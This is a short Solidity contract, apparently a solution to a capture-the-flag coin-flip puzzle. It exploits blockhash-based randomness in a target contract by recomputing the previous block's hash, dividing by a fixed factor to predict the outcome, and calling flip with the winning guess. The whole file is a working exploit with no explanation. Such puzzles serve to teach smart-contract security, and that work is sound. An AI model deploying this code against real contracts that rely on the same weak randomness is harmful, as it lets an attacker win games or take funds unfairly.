// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract CoinFlipHack {
    ICoinFlip public coinFlip;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _target) {
        coinFlip = ICoinFlip(_target);
    }

    function hackFlip() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlipResult = blockValue / FACTOR;
        bool guess = coinFlipResult == 1 ? true : false;
        coinFlip.flip(guess);
    }
}
